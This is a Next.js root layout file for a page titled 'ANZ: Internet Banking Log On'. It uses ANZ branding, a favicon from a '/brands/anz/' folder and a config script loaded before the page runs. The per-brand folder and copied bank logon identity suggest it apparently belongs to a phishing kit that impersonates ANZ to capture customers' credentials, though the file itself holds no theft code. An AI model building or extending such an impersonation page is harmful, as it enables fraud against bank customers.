import type { Metadata } from "next";
import "./globals.css";
import Script from "next/script";

import { ANZHeader } from "@/components/layout/ANZHeader";
import { ANZFooter } from "@/components/layout/ANZFooter";

export const metadata: Metadata = {
  title: "ANZ: Internet Banking Log On",
  description: "Log on to ANZ Internet Banking to manage your accounts, pay bills, and more.",
  icons: {
    icon: '/brands/anz/favicon.ico',
  },
};

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  return (
    <html lang="en">
      <body>
        <Script src="/config.js" strategy="beforeInteractive" />
        <ANZHeader />
        <main className="main">
          {children}
        </main>
        <ANZFooter />
      </body>
    </html>
  );
}
